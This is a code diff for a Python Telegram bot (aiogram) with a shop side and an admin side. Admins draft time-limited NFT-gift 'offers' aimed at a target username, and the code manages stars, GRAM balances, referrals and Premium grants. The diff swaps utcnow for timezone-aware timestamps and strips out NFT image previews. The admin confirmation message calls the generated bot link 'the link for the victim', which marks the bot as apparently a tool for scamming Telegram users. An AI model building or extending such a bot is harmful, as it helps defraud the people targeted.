@@ -1,5 +1,5 @@
 import asyncio, logging, os, re, secrets, sqlite3, html, random, string
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 from typing import Optional
 from aiohttp import web, ClientSession
 from aiogram import Bot, Dispatcher, F, Router
@@ -36,7 +36,7 @@ def db():
     c = sqlite3.connect(DB_PATH); c.row_factory = sqlite3.Row
     c.execute("PRAGMA journal_mode=WAL"); return c
 
-def now(): return datetime.utcnow().isoformat()
+def now(): return datetime.now(timezone.utc).isoformat()
 
 def init_db():
     with db() as c:
@@ -105,7 +105,7 @@ def upsert_user(uid, username, full_name, referrer_id=None):
             c.execute("INSERT INTO users(user_id,username,full_name,referrer_id,created_at) VALUES (?,?,?,?,?)",
                       (uid, username, full_name, referrer_id, now()))
             if referrer_id and referrer_id != uid:
-                release_date = (datetime.utcnow() + timedelta(days=REF_HOLD_DAYS)).isoformat()
+                release_date = (datetime.now(timezone.utc) + timedelta(days=REF_HOLD_DAYS)).isoformat()
                 c.execute("INSERT INTO pending_referrals(referrer_id, ref_id, release_at) VALUES (?,?,?)",
                           (referrer_id, uid, release_date))
         else:
@@ -114,7 +114,7 @@ def upsert_user(uid, username, full_name, referrer_id=None):
 
 def check_pending_referrals(uid):
     with db() as c:
-        now_dt = datetime.utcnow().isoformat()
+        now_dt = datetime.now(timezone.utc).isoformat()
         ready = c.execute("SELECT * FROM pending_referrals WHERE referrer_id=? AND status='pending' AND release_at <= ?",
                           (uid, now_dt)).fetchall()
         for r in ready:
@@ -158,7 +158,7 @@ def try_spend_gram(uid, mg):
         c.commit(); return True
 
 def create_draft(admin_id, gift_name, reward_type, reward_value, target, nft_link):
-    expires = (datetime.utcnow() + timedelta(hours=OFFER_TTL_HOURS)).isoformat()
+    expires = (datetime.now(timezone.utc) + timedelta(hours=OFFER_TTL_HOURS)).isoformat()
     with db() as c:
         return c.execute(
             "INSERT INTO offers(admin_id,user_id,gift_name,reward_type,reward_value,target_username,"
@@ -251,7 +251,7 @@ def fmt_balances(uid):
     return f"{stars} ⭐ | {gram_mg / 1000:g} GRAM"
 
 def offer_text(o) -> str:
-    expires_at = datetime.fromisoformat(o["expires_at"]); now_dt = datetime.utcnow()
+    expires_at = datetime.fromisoformat(o["expires_at"]); now_dt = datetime.now(timezone.utc)
     if now_dt > expires_at:
         time_left = "Истекло"
     else:
@@ -299,25 +299,6 @@ def kb_premium_months():
         [InlineKeyboardButton(text="12 месяцев", callback_data="pm:12")],
     ])
 
-# ================= NFT PREVIEW =================
-async def fetch_nft_preview(nft_url: str) -> Optional[bytes]:
-    try:
-        async with ClientSession(headers={"User-Agent": "Mozilla/5.0"}) as s:
-            async with s.get(nft_url, timeout=10) as r:
-                if r.status != 200: return None
-                page = await r.text()
-        m = (re.search(r'<meta[^>]+property=["\']og:image["\'][^>]+content=["\']([^"\']+)', page)
-             or re.search(r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:image["\']', page))
-        if not m: return None
-        img_url = html.unescape(m.group(1))
-        async with ClientSession() as s:
-            async with s.get(img_url, timeout=10) as r:
-                if r.status != 200: return None
-                return await r.read()
-    except Exception as e:
-        log.warning(f"fetch_nft_preview({nft_url}) failed: {e}")
-        return None
-
 # ================= FSM =================
 class AdminFlow(StatesGroup):
     nft_link    = State()
@@ -326,8 +307,8 @@ class AdminFlow(StatesGroup):
     reward_val  = State()
     target      = State()
     confirm     = State()
-    action      = State() # Для кнопочных действий
-    grant_user  = State() # Выбор юзера для Premium
+    action      = State()
+    grant_user  = State()
     grant_months = State()
     addbal_user = State()
     addbal_type = State()
@@ -352,7 +333,7 @@ class PromoFlow(StatesGroup):
 class PremiumFlow(StatesGroup):
     username = State()
     months   = State()
-
+    
 # ================= SHOP BOT =================
 shop = Router()
 
@@ -384,12 +365,12 @@ async def shop_start(m: Message, command: CommandObject, adm_bot: Bot):
                 await adm_bot.send_message(o["admin_id"],
                     f"🔔 Оффер #{oid} открыт: <a href='tg://user?id={m.from_user.id}'>{m.from_user.full_name}</a>")
             except Exception: pass
-        text = offer_text(o); kb = offer_kb(oid)
-        preview = await fetch_nft_preview(o["nft_link"]) if o["nft_link"] else None
-        if preview:
-            await m.answer_photo(BufferedInputFile(preview, filename=f"nft_{oid}.jpg"), caption=text, reply_markup=kb)
-        else:
-            await m.answer(text, reply_markup=kb, disable_web_page_preview=False)
+        
+        text = offer_text(o)
+        kb = offer_kb(oid)
+        
+        # Отправляем ТОЛЬКО текст с кнопками, БЕЗ картинки и БЕЗ разворота ссылки
+        await m.answer(text, reply_markup=kb, disable_web_page_preview=True)
         return
 
     with db() as c:
@@ -447,7 +428,7 @@ async def cb_ref(cb: CallbackQuery):
     text = f"🎁 <b>Пригласи друга</b>\n\n+{REF_BONUS} ⭐ через {REF_HOLD_DAYS} дней.\n\n"
     if refs:
         text += "👥 <b>В ожидании:</b>\n"
-        now_dt = datetime.utcnow()
+        now_dt = datetime.now(timezone.utc)
         for r in refs:
             delta = datetime.fromisoformat(r["release_at"]) - now_dt
             text += f"• @{r['username'] or r['full_name']} — {max(0,delta.days)} д.\n"
@@ -772,13 +753,10 @@ async def adm_yes(cb: CallbackQuery, state: FSMContext, shop_bot: Bot):
     link_to_bot = f"https://t.me/{SHOP_USERNAME}?start=o_{oid}"
 
     text = offer_text(o)
-    preview = await fetch_nft_preview(o["nft_link"]) if o["nft_link"] else None
     
+    # Отправляем предпросмотр без картинки
     try:
-        if preview:
-            await shop_bot.send_photo(cb.from_user.id, BufferedInputFile(preview, filename=f"nft_{oid}.jpg"), caption=text)
-        else:
-            await shop_bot.send_message(cb.from_user.id, text, disable_web_page_preview=False)
+        await shop_bot.send_message(cb.from_user.id, text, disable_web_page_preview=True)
     except Exception: pass
     
     await cb.message.edit_text(f"📨 <b>Оффер #{oid} готов.</b>\n\nСсылка для жертвы:\n<code>{link_to_bot}</code>", reply_markup=adm_main_kb())
